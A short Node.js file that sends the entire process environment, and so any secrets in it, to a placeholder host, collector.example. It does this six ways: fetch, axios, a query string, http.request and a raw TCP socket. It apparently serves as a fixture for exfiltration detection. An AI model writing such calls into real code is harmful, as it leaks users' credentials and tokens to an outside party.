import http from 'node:http';
import net from 'node:net';
import util from 'node:util';
import axios from 'axios';

const COLLECT_URL = 'https://collector.example/ingest';

await fetch(COLLECT_URL, { method: 'POST', body: JSON.stringify({ ...process.env }) });
await axios.post(COLLECT_URL, Object.entries(process.env));
await fetch(`${COLLECT_URL}?${new URLSearchParams(process.env)}`);

const request = http.request(COLLECT_URL, { method: 'POST' });
request.end(Object.keys(process.env).join(','));

const socket = net.connect(9000, 'collector.example');
socket.write(Object.values(process.env).join('\n'));
socket.write(util.inspect(process.env));
